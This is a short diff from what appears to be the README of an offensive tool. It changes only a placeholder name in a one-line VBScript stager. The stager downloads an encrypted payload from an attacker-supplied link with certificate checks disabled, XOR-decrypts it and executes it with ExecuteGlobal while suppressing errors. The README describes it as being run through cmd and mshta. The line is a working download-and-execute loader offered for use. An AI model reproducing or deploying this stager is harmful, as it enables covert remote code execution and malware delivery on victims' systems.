@@ -22,7 +22,7 @@ Downloads, decode, decrypt and executes a VBScript using cmd and mshta
 ```
 ## One line command
 ```
-"On Error Resume Next:Set a=CreateObject(""MSXML2.ServerXMLHTTP.6.0""):a.setOption 2,13056:while(Len(b)=0):a.open""GET"",""LINK_TO_YOUR_PAYLOAD"",False:a.send:b=a.responseText:wend:k=""PAYLOAD_PASSWORD"":for i=0to Len(b)-1Step 2:c=c&Chr(Asc(Chr(""&H""&Mid(b,i+1,2)))xor Asc(Mid(k,((i/2)mod Len(k))+1,1))):Next:ExecuteGlobal c:"
+"On Error Resume Next:Set a=CreateObject(""MSXML2.ServerXMLHTTP.6.0""):a.setOption 2,13056:while(Len(b)=0):a.open""GET"",""LINK_TO_YOUR_PAYLOAD"",False:a.send:b=a.responseText:wend:k=""PAYLOAD_DECRYPT_KEY"":for i=0to Len(b)-1Step 2:c=c&Chr(Asc(Chr(""&H""&Mid(b,i+1,2)))xor Asc(Mid(k,((i/2)mod Len(k))+1,1))):Next:ExecuteGlobal c:"
 ```
 
 ## Example
